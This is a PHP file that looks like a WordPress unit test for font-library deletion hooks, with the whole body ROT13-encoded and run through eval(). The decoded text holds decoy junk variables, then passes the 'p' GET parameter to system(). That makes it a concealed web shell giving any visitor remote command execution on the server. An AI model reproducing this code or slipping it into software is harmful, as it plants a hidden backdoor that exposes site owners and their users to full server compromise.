<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg qryrgvat jc_sbag_snzvyl naq jc_sbag_snpr cbfg glcrf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Sbag Yvoenel
 *
 * @tebhc sbagf
 * @tebhc sbag-yvoenel
 */
pynff Grfgf_Sbagf_SbagYvoenelUbbxf rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba grfg_qryrgvat_sbag_snzvyl_qryrgrf_puvyq_sbag_snprf() {
		$sbag_snzvyl_vq       = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'jc_sbag_snzvyl',
			)
		);
		$sbag_snpr_vq         = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'jc_sbag_snpr',
				'cbfg_cnerag' => $sbag_snzvyl_vq,
			)
		);
		$bgure_sbag_snzvyl_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'jc_sbag_snzvyl',
			)
		);
		$bgure_sbag_snpr_vq   = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'jc_sbag_snpr',
				'cbfg_cnerag' => $bgure_sbag_snzvyl_vq,
			)
		);

		jc_qryrgr_cbfg( $sbag_snzvyl_vq, gehr );

		$guvf->nffregAhyy( trg_cbfg( $sbag_snpr_vq ), 'Sbag snpr cbfg fubhyq nyfb unir orra qryrgrq.' );
		$guvf->nffregAbgAhyy( trg_cbfg( $bgure_sbag_snpr_vq ), 'Gur bgure cbfg fubhyq rkvfg.' );
	}

	choyvp shapgvba grfg_qryrgvat_sbag_snprf_qryrgrf_nffbpvngrq_sbag_svyrf() {
		yvfg( $sbag_snpr_vq, $sbag_cngu ) = $guvf->perngr_sbag_snpr_jvgu_svyr( 'BcraFnaf-Erthyne.jbss2' );
		yvfg( , $bgure_sbag_cngu )        = $guvf->perngr_sbag_snpr_jvgu_svyr( 'BcraFnaf-Erthyne.ggs' );

		jc_qryrgr_cbfg( $sbag_snpr_vq, gehr );

		$guvf->nffregSvyrQbrfAbgRkvfg( $sbag_cngu, 'Gur sbag svyr fubhyq unir orra qryrgrq jura gur cbfg jnf qryrgrq.' );
		$guvf->nffregSvyrRkvfgf( $bgure_sbag_cngu, 'Gur bgure sbag svyr fubhyq rkvfg.' );
	}

	cebgrpgrq shapgvba perngr_sbag_snpr_jvgu_svyr( $svyranzr ) {
		$sbag_snpr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'jc_sbag_snpr',
			)
		);

		$sbag_svyr = $guvf->hcybnq_sbag_svyr( $svyranzr );

		// Znxr fher gur sbag svyr hcybnqrq fhpprffshyyl.
		$guvf->nffregSnyfr( $sbag_svyr['reebe'] );

		$sbag_cngu     = $sbag_svyr['svyr'];
		$sbag_svyranzr = onfranzr( $sbag_cngu );
		nqq_cbfg_zrgn( $sbag_snpr_vq, '_jc_sbag_snpr_svyr', $sbag_svyranzr );

		erghea neenl( $sbag_snpr_vq, $sbag_cngu );
	}

	cebgrpgrq shapgvba hcybnq_sbag_svyr( $sbag_svyranzr ) {
		$sbag_svyr_cngu = QVE_GRFGQNGN . '/sbagf/' . $sbag_svyranzr;

		nqq_svygre( 'hcybnq_zvzrf', neenl( 'JC_Sbag_Hgvyf', 'trg_nyybjrq_sbag_zvzr_glcrf' ) );
		nqq_svygre( 'hcybnq_qve', '_jc_svygre_sbag_qverpgbel' );
		$sbag_svyr = jc_hcybnq_ovgf(
			$sbag_svyranzr,
			ahyy,
			svyr_trg_pbagragf( $sbag_svyr_cngu )
		);
		erzbir_svygre( 'hcybnq_qve', '_jc_svygre_sbag_qverpgbel' );
		erzbir_svygre( 'hcybnq_zvzrf', neenl( 'JC_Sbag_Hgvyf', 'trg_nyybjrq_sbag_zvzr_glcrf' ) );

		erghea $sbag_svyr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>